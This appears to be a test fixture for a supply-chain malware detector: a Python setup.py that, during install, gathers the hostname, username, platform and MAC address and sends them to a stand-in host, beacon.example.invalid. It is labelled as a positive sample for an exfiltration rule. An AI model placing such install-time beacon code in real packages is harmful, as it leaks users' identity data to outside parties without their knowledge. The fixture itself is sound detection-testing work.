"""PHX-EXF-003 positive: SystemIdentity -> NetworkEgress at install time.

Four identity sources on one path, which is the "who installed me" beacon shape that
dominates install-time payloads in the Backstabber corpus.
"""
import getpass
import platform
import socket
import urllib.parse
import urllib.request
import uuid

from setuptools import setup

_identity = {
    "host": socket.gethostname(),
    "user": getpass.getuser(),
    "platform": platform.platform(),
    "mac": str(uuid.getnode()),
}
_query = urllib.parse.urlencode(_identity)
urllib.request.urlopen("http://beacon.example.invalid/hello?" + _query)

setup(name="hostname-beacon-setup", version="1.0", packages=[])
